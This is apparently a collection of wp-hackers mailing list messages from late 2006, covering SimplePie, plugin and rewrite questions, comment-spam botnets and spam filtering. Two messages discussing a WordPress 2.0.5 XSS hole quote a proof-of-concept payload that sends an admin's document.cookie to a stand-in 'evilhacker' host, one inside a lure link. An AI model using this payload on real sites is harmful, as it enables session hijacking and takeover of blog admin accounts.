handled. The new SimplePie comes with significantly improved support
for non-Latin languages. Specifically, it supports 98 different
character sets. It also has much better support for detecting what
character set the feed is being published with, so that the feed can
be displayed in the proper language.

So whether it's English, French, Russian, Hebrew, Arabic, Turkish,
Chinese, Japanese, Korean, Vietnamese, or just about any other

MapieRSS breaks on the latter two, it breaks on an un-encoded

I took a brief look the code for SimpliePie, it seems much cleaner. I
can already see something that could be changed - that's the beauty of

I just absoloutely hate it when something so nice has a "feature" that
drives me mad.

There's a reason why AdBlock isn't built into Firefox: ads are there
for a reason.
We're all bloggers. I spend 22 hours a day writing software and
posting for my readers - all for free. I make a tiny bit of money from
the ads - enough for now.

So when a feed aggregator's "big feature" is:

/*********************************************************************\

"Advertisments be Damned"
SimplePie has limited support for stripping ads from feeds. We hate it
when people put ads in their feeds?it's so distracting when you're
trying to read.

We decided to go after some of the big guns first?Pheedo, Google
AdSense, and certain Doubleclick ads. In the future we'll definitely
expand on these efforts to the best of our abilities.
/*********************************************************************\

That's certainly not a nice thing. I mean, WTF. Just because *their*
developers have people buying them things from the Amazon wishlist and
donating money to the project, it doesn't mean that everyone else
does.

Ads on a site that makes money off you anyway (like eBay or Real or
something) are one thing, but ads on websites that devote themselves
to their readers are another.

Two minutes ago I was about to rip MagpieRSS out of my code, now
though, I'm not so sure. I can easily remove the ad-stripper (I don't
even think it blocks my FeedBurner ads), but it's a matter of
principle. Don't they get it???

Though that may be, i wouldnt recommend running windows for a web
server. Besides, almost all web hosts run *nix so i doubt he will have
a problem.

Im sure you can disable or hack it out. But i agree - that shouldnt be
part of a rss parser.

Expand your experience -- try pointing MagpieRSS at this valid feed:

Not that I've tried that one with SimplePie yet... :)

-1 to making this core. 99% of themes have both hooks and those that don't
should. We can't be responsible for invalid themes. It'd just be bloat that
rarely be used.

I don't think a universal package of code for distribution (like ButtonSnap)
would be bad though for the plugins that need it.

Subject: Image upload hook

Happy Holidays to all.

I'm wondering if there is a hook for image uploading. Specifically, the location.

It's hard to fully explain what the problem is but our cluster is based on NFS clustering and one of the key reasons for this is so that every web server has the most current file information (I.e. Uploaded images). If a post is created with an image, the content goes to the db server but the image needs to be immediately available on the web server cluster regardless of what server the load balancer decides to pull from. NFS allows us to do that conveniently but has just recently begun to fail as we are hitting a bottle neck on concurrent NFS connections.

It might help us to have a hook for image uploading that would allow us to put media files on a server out of circulation (still trying to figure how exactly we'd _place_ files on this "remote" server. Then we could set the upload path to this server and images would pull from there eliminating the bulk of the need for NFS.

Thoughts? Comments? Expertise?

Cool.  It stood out when I glanced through the code and I thought better to
ask now than cause a 2.0.7.

Thanks for the reply!

Well, to further the discussion, we've agreed on a tag, WPadvanced to
attempt to lure more knowing eyes on issues outside the normal support forum
skill sets.

feed://http//wordpress.org/support/rss/tags/wpadvanced is the feed link from
the forums.

I'll monitor the feed myself to be sure no unsuspecting threads get tagged.
Also know the feed generates an update any time a post is added to any
thread tagged, not just when new threads are created.

However this shouldn't be an issue, as the tag is only intended for threads
needing a higher level of attention, not general ones, meaning it
*shouldn't* be a high traffic feed.

Any suggestions on better attempting this idea still appreciated.

I'm sure someone could do it, still keeping legacy compatibility. The last
message a la Matt says "awaiting new patches." Anyone? :)

Ditto

Do any of us have setup a service that emails based upon new feed
content.  It should be easy enough to crank out, but if someone's
already written it or knows of one that doesn't send you adds too, I'd
be interested.  If not, maybe I'll just set one up, but SURELY these are
out there already...

Sorry Michael, I'm not seeing a problem using query_posts() in
2.0.5.

But to be certain, I just now set up a standard query_posts('cat=1')
as well as your suggestion to use $wp_query->set on my test site. And
it worked as expected.

Very odd Kaf.  I did the same thing on a test site using the default theme,
and no go.  I did have some plugins installed, but nothing that I would have
thought would interfere with postings, and the poster in that thread said
they had no plugins active.  And as I said, I even tried using category_name
to no avail.

Guess I might want to deactivate plugin by plugin to be sure.

The upload path for the inline uploader used in the Post page is set

As per the other reply, the location is pretty hookable, especially in 2.1.

I know it's not directly related to your problem, but the way you 
describe the problems it sounds like the setup might have some design 
decisions that could stand re-addressing. NFS is used for some really 
huge stuff, so to be hitting limits there it's probably a configuration 
or hardware error. Also, executed PHP files should always be local.

Hi,
I wrote a plugin that stores some data in an additional table named

table. It all works fine until i tried using LIKE in the sql query,  
the results come out null and i get an error (by running $wpdb-

example query:
SELECT * FROM wp_designs WHERE (description LIKE '%design%' OR name

Any ideas?

I'm not sure if this is the problem for your specific case, but try  
switching to the default or classic theme, too.  Some themes do  
strange things that can poison later query_post()s (I believe this  
has been addressed in 2.1).

I would say try and use $wpdb->query and then try to return the results with
mysql_result() and see if you get the same thing happening. That would mean
there is a problem with $wpdb->query. If that works try adding a second
argument to return it as an ARRAY_A or ARRAY_N.

Hi to all,

I'm creating users using that code:

$userclean = sanitize_user($username, true);
$userclean = apply_filters('pre_user_login', $userclean);
require_once(ABSPATH . "wp-includes/registration-functions.php");
wp_create_user($userclean, $password, $vb_user['email']);

the result seem a correct user creation in wp_users and enough usermeta
rows:

20 wp_capabilities a:1:{s:11:"contributor";b:1;}
20 nickname prova

But while i try to login, I'm blocked for a lack of user privileges... ?
Some help? I'm stuck.

Technically an image *is* text, right? It's an <img> tag, so you should just
grab the HTML and use PHP string functions to grab the image source from the
img tag.

Default themes play an hugely important role. Quick-and-dirty bloggers  
don't bother to changing them. At a certain point, visual identity  
become a force that restricts alternation. It was a pretty theme that  
had me download WordPress back in 2004. WordPress wasn't even a  
'household name' at the time.

While Ballmer yells out "developeH^s, developeH^s, developeH^s", let's  
not forget that WordPress is beyond hackers. It's needs "designers,  
designers, designers". The theme contests are just as important as  
those template contests for OpenOffice.org.

Best wishes,

Roy

Thanks Computer Guru. I was hoping for a nice and neat variable like
$selectedimage or something. Oh well. I'll start digging around and figure
it out. Thanks for the help.

Actually, it's not too difficult:

<?php
function getImage($img) {
    /* Function to get image from HTML source
     * Accepts $img with either " or ' as attribute enclosure
     * e.g. $img = '<img src="http://blabla.com/my.png" />';
     * or $img = "<img src='http://blabla.com/my.png' />";
     */
    $img = str_replace("\"", "'", $img); //Replace all " with '
    $begin = stripos($img, "src='") + 5;
    $img = substr($img, $begin);
    $end = stripos($img, "'");
    $img = substr($img, 0, $end);
    return $img;
}
?>

Thanks again for the help. I afraid that I'm not savvy enough to figure this
out. I've tried to implement this with no results. I'm sure it's my error.
What I'm trying to return looks like this when a string of text is selected

return '<span class="generic">' . $selectedtext . '</span>';

But when it comes to the function you wrote, I have no idea what to
substitute "$selectedtext" with.

What do you want to come out?
The image?
The image address?
The image HTML?

return '<span class="generic">' . getImage($selectedtext) . '</span>';

Really straight forward PHP, nothing more I can do.

That got me a lot closer except for the *"Fatal error*: Call to undefined
function: stripos()". Your help has really appreciated. I work this out.
Thanks.

Or better, this regex which should work fine:

<?php
function getImage($img) {
    preg_match('#<img(.*?)src=("|\')(.*?)("|\')( /\>|\>)#i', $img, $match);
    return $match[3];
}

Subject: [wp-hackers] Help on  code flow
Message-ID: <20061225123757.14095.qmail@web54112.mail.yahoo.com>

Hello,
   
  Im Sai Krishna.  I was trying to understand the  code flow and various functions that were used in the entire wordpress. Im using wordpress 2.0 on a windows with apache system though server is of Linux.  Im writing an API that comes with some kind of xml tags
   
  Can anybody help me in letting me know the how this code flow went. Though I was able to insert the data into database through postie, I was unclear how the reading of data is happening i.e displaying of data on the blog
   
  I went through your documentation but it was not so helpful. I can promise you of atleast helping in you in the documentaion  of functions list which I found quiet helpful

Once SimplePie 1.0 RC 1 is out I'll probably do something about it  
(till then, the API is still changing, so no point doing it yet).

Hi,

Your  question  is  very broad, but perhaps I can  help.  It
sounds  as though your main problem involves the  insertion,
use,  and display of some data which you have stored in  XML
form.  You  accommodate  the database, but you  can't  quite
manage  to 'pull' the information out of it (please  correct
me  if  there's a misconception here). I suggest  you  start
from the core function which displays content...

   roy@BAINE:~/public_html/wordpress> cat index.php
   <?php
   /* Short and sweet */
   define('WP_USE_THEMES', true);
   require('./wp-blog-header.php');
              ^^^^^^^^^^^^^^^^^^

Following through to ./wp-blog-header.php

   <?php

   if (! isset($wp_did_header)):
   if ( !file_exists( dirname(__FILE__) . '/wp-config.php') ) {
                                           ^^^^^^^^^^^^^^
         if ( strstr( $_SERVER['PHP_SELF'], 'wp-admin') ) $path = '';
         else $path = 'wp-admin/';


Just follow the trail of PHP files and use the documentation
in          the          WordPress          Codex          <
http://codex.wordpress.org/Main_Page  >. With the API's, you
will  not need to intimately know the code. It will help you
understand  how each function works, what purpose it  serves
and how to override it.

Best wishes,

Roy

Stripos is a php 5 only function. To achieve the same effect on php 4
i would use regex.

Hi Roy,
   
  Great Thanks for the help. I was able to go through the info what you have given.
   
  But somehow I figured out that what I wanted was in /wp-includes/classes.php.
   
  The filtering at the query level so that I can write my where clause to get the data that I stored.
   
  To be precise it is here
   
  //only select past-dated posts, except if a logged in user is viewing a single: then, if they
  //can edit the post, we let them through
  if ($pagenow != 'post.php' && $pagenow != 'edit.php' && !($this->is_single && $user_ID)) {
   $where .= " AND post_date_gmt <= '$now'";
   $distinct = 'DISTINCT';
  }.
   
  Here I add my where clause to get all the blogs that I need.
   
  Thank You
  Sai Krishnna

  Hi,

Your question is very broad, but perhaps I can help. It
sounds as though your main problem involves the insertion,
use, and display of some data which you have stored in XML
form. You accommodate the database, but you can't quite
manage to 'pull' the information out of it (please correct
me if there's a misconception here). I suggest you start
from the core function which displays content...

roy@BAINE:~/public_html/wordpress> cat index.php
/* Short and sweet */
define('WP_USE_THEMES', true);
require('./wp-blog-header.php');
^^^^^^^^^^^^^^^^^^

Following through to ./wp-blog-header.php


if (! isset($wp_did_header)):
if ( !file_exists( dirname(__FILE__) . '/wp-config.php') ) {
^^^^^^^^^^^^^^
if ( strstr( $_SERVER['PHP_SELF'], 'wp-admin') ) $path = '';
else $path = 'wp-admin/';


Just follow the trail of PHP files and use the documentation
in the WordPress Codex <
http://codex.wordpress.org/Main_Page >. With the API's, you
will not need to intimately know the code. It will help you
understand how each function works, what purpose it serves
and how to override it.

Best wishes,

Roy

stripos is php 5 strpos isn't. So if you're not a regex guru, I'd recommend
building your own stripos the easy way.  This is how I do it:
 
if (!function_exists("stripos")) {
  function stripos($str, $needle, $offset=0)
  {
    return strpos(strtolower($str), strtolower($needle), $offset);
  }
} 

(That particular version is copied from http://us2.php.net/function.stripos
)

Hi!

I've opened ticket #3499 with a patch to have attachments created
for XML-RPC media uploads in 2.0.6 (I can always hope, can't I?).
The patch is a backport from trunk.

Any chance of having this in 2.0.6 or is it too late?  (Mark?)

Related: ticket #3452, changesets [4628] and [4643].

Best regards,

Why does Akismet always insist on labeling trackbacks from Netscape as spam?

Has anyone else experienced this?

Your question isn't very clear, I'm not sure whether you are saying this
happens when for your main adimn account or for the newly created
accounts...

If the former, are you by any chance using WordPress' built-in object cache?
If so, clear the cache directory, it's probably a result of mangled command
somewhere...

Hard to say, your best bet is to mark it as "not spam" in your interface 
and send in a note through the contact form:

yep, for the past ~2 weeks...been observing a spike (using tail -f )
in POST requests made to ~/wp-comments.php on my installations.
mod_security has been busy issuing 412:precondition failed errors for
matching filters, still there are dozens of keywords/phrases that go
through, hopefully those using Akismet, SK or Bad Bahavior will have
an added layer of protection - less database pollution. :)

Oh, yes, absolutely. My site got hammered by requests to
wp-comments-post.php every few seconds. All requests had a UserAgent
of "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Maxthon)"
and so many different IP-addresses it obviously was caused by a bot
net.

I switched from SpamKarma to Akismet, renamed wp-comments-post.php and
denied all requests to the old wp-comments-post.php - which obviously
didn't scare away manually submitted commentspam, but relieved the
server from a lot of PHP-work.

Today not a single Maxthon-UserAgent so far.

Maxthon is a tabbed version of IE -- I even see IE7 with Maxthon in
my logs.  (None of which are posting comments -- spam or real...)

Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Maxthon; InfoPath.1; .NET CLR 2.0.50727)

You probably need to use the query_vars hook.  Mark Jaquith posted some code that might be of use a
little while ago:

http://comox.textdrive.com/pipermail/wp-hackers/2006-December/009937.html

This part might help you:

Hi,
  Donot mind my questions if they are too silly as I just started coding on this.Also on my english too. Im still unclear where is what in word-press.
   
  I tried adding this in various places, but it is not getting 'loc'..  Its getting the rest of the query_vars like Array ( [feed] => rss3 [m] => 0 [p] => 0 )
   
  Can you tell me where exactly parsing of query happens, I mean which file.... 
   
  I tried putting classes.php, wp-feed.php, wp-rss3.php (this is my file, exactly same only name is different as of now).
   
   
  Thank You
  Sai Krishna

think you have to put the code in a plugin :)

Yes, but but that is a later part for me. 
   
  For understanding purpose. Im trying to put it here first. later on Ill build my plugin and put there. Im still in the starting stage of wordpress.
   
   Looks like I need to look at rewrite rules. It is adding & and the new parameter in the query.
  and apply_filter just before the template_loading...
   
  Am I right??

Check out this code (from an earlier thread).  Hopefully it'll make  
the process a little more clear.

Hi,
  I've seen it given by Jamie Talbot, But Im still not clear where to add it . Im still new to wordpress.
  say If Im generalising all the feeds of rss3(same file as rss2) that Im generating will have an additional parameter called 'loc' which will have a value of location say london.
   
  I tried adding before template_loader.php, wp-feed.php, wp-rss3.php,classes.php..
  But no luck for 'loc'..
   
  I thought rewrite was important after seeing the classes.php about that rewrite is adding for cat=somevalue&paged=somenumeric in wp_rewrite class.

The problem happens when I create new users with user, password and
email given. 

I'm sorry about lack of clearty. Because I really dunno what's wrong. I
read what happens when creating new users by wp admin interface.
I seemed wp calls just wp_create_user, so I wanted to do the same.

Can you suggest some reading about this object caching?

I use Maxthon with IE7 (been using Maxthon since the days of it being called
MyIE2). It makes tabbed browsing soo much easier with mouse gestures hehe.

Actually what a lot of these spammers do is make a post manually via their
browser and use a program like Smart Sniffer to get the packet header
information. They then just copy that packet information into a string
inside Visual Basic and generate a small Winsock program to go through and
post to different sites. A lot of the old Yahoo booter sites use to have
this source code listed on them.

I have been using BB2 + Akismet on my site. BB2 blocks around 33,000 access
attempt per week and Akismet still catches about 600 comments a day. Before
installing BB2, I had one night where I went to bed and had only about 30
comments in Akismet. Woke up the next morning and I had over 10,000
comments. That is with wp-comments-post removed and renamed, so they are now
going through and filtering out the form action. Luckily my hosting company
is very understanding about this and working with me to stop it.

Just  bandwidth  drain ($$). Over   100,000   requests   for
wp-comments-post.php.  /Huge/  spike in December  23rd-25th.
Maybe   they   rely  on  admins  being  absent.  Same   with
Guestbooks, FWIW. Advanced Gustbook had over 10,000 requests
for  comment.php  and over 7,000 for addentry.php.  Glad  to
hear  it  isn't just me. Join the Social^TM. It's part of  a
Windows  botnet  epidemic,  which also involves  86  billion
E-mail SPAM per day (and constantly rising too).

Best wishes,

Roy

That's  a pretty bad thing, with around 1000 trackbacks sent
per day. I'm a Navigator there, so I'll let the devs know.

Matt, I'm receiving only a patchy assortment of this mailing
list's  messages. I don't know if it's mailman or my  daemon
that's dropping them. The recent rise in volumes off SPAM is
worrying me a lot and, yes, I know it's slightly off topic.

Agreed I use it to, with IE7 at home and with IE6 at work.  Because it is
portable and doesn't involve an install it is the only decent option for
many office environments that have a policy against installing software.

AWStats doesn't detect Maxthon.  I suppose I should change that...  And my
log is too polluted with my visits to easily determine how much Maxthon
traffic I get.  It all looks like IE.  If IE7 had the click and drag feature
that opened a new tab or searched for the dragged content, I might switch to
pure IE7.  That's really all I miss.

Ah, so not only does it make sense to make it look like a real browser, but
it also is a laziness factor as, after all, why should they change any of
the data being submitted?

Are you saying BB2 also reduces the load on your site?  I've only been using
Akismet and it's largely sufficient.  Every now and then I might have 2 or
three slip through, but then it is fine for another month or more.

Heh, I've pondered combining the wp-comments-post code with a nonce system.
Then actual comment submission page is dynamically generated per page via
the post number and some other unique seed and expires within an hour.

Well it isn't your fault people are spammers... :)  Fortunately,
TheCodeCave's gotten only 103 spams caught by Akismet in the last two days.
So my current load is relatively small.

Heh, I used to use MyIE2 back in the day, but then I discovered Firefox and
never looked back.

And you realize there are gobs of mouse gestures extensions for FF out
there, right? I mean if you can think of it, someone's probably written a FF
extension to do it. ;)

I watch the Technorati tag "comment spam" here and it's very interesting what 
people are saying about it. :) I drop some hints here and there to help them 
out a little.

Here is the RSS feed for your fav. reader software:
http://feeds.technorati.com/feed/posts/tag/comment%20spam

My "defensive wall" here is BB2, SK2 with Akismet-Plugin and my own CPR. :)

SK2 has stopped > 3,000 spam so far and CPR > 1,000 (they currently count the 
same comment spam as their own which is a bug in CPR).

BB2 has just stopped a little about 1,000 in 7 days here. But yes, I got more 
spam than some weeks ago.

My favorite is "lesbian dildo anal"... ;-)

Why not use some form of CAPTCHA on the submit?

I have a plugin that does this, but it hooks into the post after Akismet 
and Span Karma 2 so they still get logged as spam at the moment, but 
nothing appears on the site or listed in comments because the plugin 
does a very unpleasant "die()" if the CAPTCHA is not met regardless of 
whether it is spam or not.

Another way of making it harder (development on the part of Wordpress 
required though) would be to generate a random md5 string based on the 
system time as part of the wordpress install/config/upgrade, and name 
the file that (for example 
add_comments_40be4e59b9a2a2b5dffb918c0e86b3d7.php - store this in the 
database and obfuscate the link in all the pages.

The other way that works for me though is to force posters to be logged 
in to comment ;-)  - I don't have many friends :-)

Cheers
Nigel

I adding some extra stats tracking 
(http://blog.joshuaeichorn.com/archives/2006/12/21/more-spam-fun/) and 
i'm still seeing at least 1 hour block every day go over 1500 spam attempts.

Stats wise it might be nice if there was a hook any plugin would call 
when it found a spam, that way I could release my stats code as a plugin 
instead of a hack.

Guys,  I'm  not  sure  it's all that  amusing.  Some  recent
wp-hackers  messages just don't show up... and I'm beginning
to  suspect  that SpamAssassin intercepts them (even with  a
generous  8.0  threshold). I haven't check this  to  confirm
because  it's  merely  impossible to wade  through  tens  or
handreds of thousands of messages... it's unresponsive.

I've  missed  at least one direct reply to my message and  I
can  see it in the static mailman archives. I've also missed
a  large  portion of this thread. It would be reasonable  to
assume  that  other  who rely on the same  blacklists,  e.g.
Apache's SA filters, will suffer also (Google included).

I  have  always thought that mailing list had some  implicit
exclusion  from  mail filters, but maybe it's no longer  the
case.

Happy holidays!

Roy

Surely you can add your own white list, can't you?  The hacker list's
subject line should be easy enough to allow through or you could just allow
the ip address of the list server 207.7.108.189.  1and1 has its own spam
filter (which is what added the ***SPAM*** tag to the text above).  But it
is wrong 99% of the time.  It's practically useless.  

So, I've written my own in PHP and cron it through my server.
http://www.thecodecave.com/article288  Since the initial configuration, I've
not gotten any false positives and now just purge the emails without even
looking at them.  I suppose I should run it without purging now and then,
but no one has ever complained about any missing emails.  So, I think I'm
still pretty good.


Email SPAM IS pretty far off topic to comment spam.  But I've got to ask...

Well..... What was the problem then????  Is this like a cliff hanger
episode?

OK found the reference..
The end of the story:
"Since June, he was told, EarthLink's mail system has been so overloaded
that some users have been missing up to 90 percent of their incoming e-mail.
It isn't bounced back to senders; it just disappears. And EarthLink hasn't
mentioned the problem to these affected customers unless they complain. The
two groups affected are those who get their mail with an EarthLink-hosted
domain and those with aliased e-mail addresses like my friend's Blackberry."

...Seems   like  it  requires  an  extension,  which   isn't
installed  by  default  (and these are not  my  Web  servers
either, so no luck there):

http://wiki.apache.org/spamassassin/ManualWhitelist

Later having a look at this...

http://spamassassin.apache.org/full/3.1.x/doc/Mail_SpamAssassin_Plugin_WhiteListSubject.html

Maybe you can figure something out. I suspect that I can add
filter rules at a level higher than SA.

I  finally  found  another  place where  Webspace  is  being
'leaked'.  I never realised that the whitelist file can grow
and  exceed 100MB of plain text. When will SPAM of  biblical
scale ever stop? Probably never. E-mail ceases to be a valid
method of communication. One misery at a time.

That is the best feature of Maxthon. Whenever I use FF or Konqueror, I
constantly catch myself trying to drag links to open it. Since I do a lot of
state and federal government work, I stick with IE, as they have policies
against other browsers.

I am on shared hosting, so I don't have access to top or any other real
stats, but it does appear that the actual server load has decreased some.
Before I installed BB2, there were times it would take 10-15 seconds to load
the site. Now it might get to 5 seconds if I am getting hammered. I haven't
really torn into BB2 to see the inner workings and figure out if it helps
with actual load. It certainly did reduce the number of spam comments
appearing in Akismet.

I believe where BB2 comes into play more is it prevents these spam programs
from crawling the actual site and finding whatever links they can.

I have been playing with a similar idea in my head. Since these spam bot
programs don't generally execute Javascript, I was thinking of coming up
with a way using a combination of a hashed time key and dynamically
inserting the form action. This would of course limit people commenting to
being only Javascript users, but that is the price to pay. 

To further reduce actual server load, it would be wise to create a dummy
wp-comments-post.php file that is blank. That way the rewrite rules would
bypass firing up the Wordpress core and in turn keep processing cycles down,
by not generating the WP 404 page.

I just got deja vu:

http://wordpress.org/support/topic/16642

It stopped working about a week later.

That plugin later evolved into WP Hashcash, which I believe is still 
effective. My favorite version of this concept is WP Gatekeeper.

None of these do anything for trackback spam.

You have to add the query var, as my example code showed.  Then you  
have to add the rewrite rule that'll populate the query var (my code  
shows that as well).  Then in your code, you'll use get_query_var 
('loc') to grab that value.

In 2005 Matt said: "The plugin works by embedding a random hidden field in
the comment form that is then checked for on posting."

I was going to protest that this is a different concept, but the defeat for
it isn't any different at all is it?  Whether you change the submission page
or add a hidden field, the defeat is still to load the page and process it
for an appropriate value.  No matter how you cut it, that's trivial to
defeat.  It might work for one small, individual blog, but the moment it is
shared, it will be worth defeating.  

DRAT.

It's a bit like cheats in the FPS realm.  They are only effective until they
are shared with someone.  From then on it is only a matter of time till
PunkBuster finds it and defeats it.  Only in this case the roles of the good
guys and the bad guys are reversed.  It's the good guys who are looking for
the technological advantage and the bad guys are looking to eliminate it.
On my VBulletin forum, the built in CAPTCHA routine is defeated regularly
and that is very annoying especially because it is someone who is doing it
from spam free routines.  BTW: Would you mind if I wrote an Akismet plugin
for VBulletin?  I'd asked you/Akismet that once before via email, but never
got a response. 

> None of these do anything for trackback spam.

Yeah, that's a problem.  You WANT trackbacks and pingbacks to be as simple
as possible because that's how you build a network of blogs.

Hello Mark,
   
   In the given URL
  http://comox.textdrive.com/pipermail/wp-hackers/2006-December/009937.html where you have given the functions
   
  the first one being
   
  function your_rewrite_rules($rules) {
  $prefix = ( strpos(get_option('permalink_structure'), '/  index.php/') === 0 ) ? 'index.php/' : ' ' ;
  $rules[$prefix . 'yourspecialsomething/(.*?)/(.*?)/?$'] =   'index.php?your_query_var=$matches[1]&another_qv=$matches[2]';
  return $rules;
 }

  My query being only this
  http://localhost/wordpress/?feed=rss3&loc=london
   
  my query_var will be feed=rss3&loc=london
   
  The $rules - Is it a rewrite rule that I need to define in PHP?? , Im afraid, Im  new to rewrite rules.
   
  your_query_var=feed
   
  another_qv=loc
   
  $matches , yourspecialsomething  are still a doubt.
   
  What do I do??

You have to add the query var, as my example code showed. Then you

Hi,

I've been searching, but I cannot seem to find a document, except this 
'Writing a plugin' (http://codex.wordpress.org/Writing_a_Plugin) which 
is a pretty nice introduction into writting plugins, that goes into more 
details of writing plugins.

I would like to know if there is some kind of document or plugin which I 
can use to make sure my plugin (which allows shops to create a store 
locator) is adhering to the WP community standards.

Specifically I'm looking for:

1) How to include style information for my plugin's interface?

The plugin uses a form to add a shop's data to a newly created table. I 
would like to layout the form in such a way that it is easily upgraded 
with Wordpress and easily changed using themes. I'm now using inline 
styles per html tag, which is a pain to use and doesn't allow per theme 
modification. Any tips?

2) Howto submit a form with data to my plugin?

Form submitting now is done using the following:

<form name="addshop" action="$_SERVER[REQUEST_URI]" method="post">";

Is this the correct way to handle this? Or is there a better, preferred 
way of doing things a la Wordpress. Basically I want to be able to 
submit form data to my plugin and preferably to a specific function. Any 
   tips?

3) Howto show a status message a la Wordpress posts?

After a form submission, I would like to let the user know of his/her 
request status. Just like Wordpress does with posts. Because I'm not 
relying on posts nor pages I presume I cannot use any of those filters 
to create this behaviour. What would be the best way to achieve a 
similar effect?

I hope somebody on this list can point me in the right direction.

ps: I would like to add my questions and your answers to the codex so 
other developers can use it like a cookbook.

grtz

Hi Guys. Tell me more about this Xss Vulnerability for Wp 2.0.5 in
wp-admin/templates.php ?

Proof of concept:

https://blogsite/wp/wp-admin/templates.php?file=<img
src=""onerror=javascript:document.location.href='http://evilhacker/captureco

Is this the solution: http://trac.wordpress.org/changeset/4665 ?

The last question, when the 2.0.6 final version ? Isn't this vulnerability
in the 2.0.6 Rc 1 ?

This was a problem for me almost two years ago when I wrote my first
plugins (CMC and BOTD) and the most common support request was from
people with non-compliant themes.

Here's an alternate idea for testing themes on activation. Similar to
the way we call wp-cron, request home?hooktest=1.

if ( isset($_GET['hooktest']) ) {
  add_action('wp_head', 'wp_head_test', 99999);
  add_action('shutdown', 'wp_hook_test');
}

function wp_head_test() {
  define('WP_HEAD', true);
}

function wp_hook_test() {
  update_option('hook_wp_head', constant('WP_HEAD'));
}

Thereafter, test get_option('hook_wp_head').

Adding wp_footer is left as an exercise for the reader.

Feel free to use this in your plugin or suggest a core implementation.

Subject: [wp-hackers] Forcing Pages to use File Extensions
Message-ID: <03bd01c72aac$f21432e0$6500a8c0@brian>

This useful hack is near complete and working, however it is currently being
applied to both wordpress pages and posts. I simply need it to only be
applied to pages and not posts.

 

Without the hack applied my pages show up at domain.com/pagename (incorrect)
and my posts show up at domain.com/2006/12/postname.html (correct).

 

With the hack applied my pages show up at domain.com/pagename.html (correct)
and my posts show up at domain.com/2006/12/postname.html.html (incorrect).

 

A .html is added to both pages and posts. I only want to add another .html
to pages, not posts.

 

The hack is simply adding $req_uri = preg_replace("|.html$|", '', $req_uri);
to line 1522 in includes/classes.php after $req_uri =
preg_replace("|^$home_path|", '', $req_uri);.

 

It seems to me that the solution is just coming up with a simple php if
statement to wrap around the extension hack that checks if the current
webpage being viewed is a page or not?

 

I've been trying for countless hours without any forum help to come up with
a simple if statement that checks if it is a page or not in
includes/classes.php.

 

I've guessed by trying different variations of this... if ( $this->is_page =
true ) { $req_uri = preg_replace("|.html$|", '', $req_uri); }

 

Could someone here help me write this if statement?

 

Here is a forums post that describes this further...

Even before the patch, isn't it true that this hole could only be
exploited by a registered user who already had the 'edit_files'
privilege set on their profile?

Yes, but that's where this is XSS problem.

For example, I make a comment on your blog like this (I dunno if I could
actually manage to get it into a comment thanks to kses, but it could also
be accomplished by getting you to visit a site where I have the link or
whatever).


<a href="http://yousite.com/wp/wp-admin/templates.php?file=<img
src=""onerror=javascript:document.location.href='http://evilhacker/captureco
okie.php?'+document.cookie;>">Check out this cool site!</a>


If you click it, it'll take you to your admin area and send your cookie
contents to the hacker. Allowing them to get into the admin area of your
site and do as they please.

Subject: [wp-hackers] Happy New Year and Predictions
Message-ID: <45983056.6070306@mullenweg.com>

I just wanted to wish everyone in the WP community a happy new year and 
to thank everyone for being a part of the movement this year. We've had 
some really amazing progress in the software and the growth has been 
hard to believe.

For fun, here's some WP predictions for 2007:

* We'll do 3 major point releases
* People will start Wordcamps around the globe
* WP will become the #1 used tool on the Technorati 100
* Daily spam will be 10x what it is today
* WYSIWYG will no longer annoy savvy writers
* Several new WP-based companies will start
* We'll figure out the whole plugin/theme directory thing

What are yours?
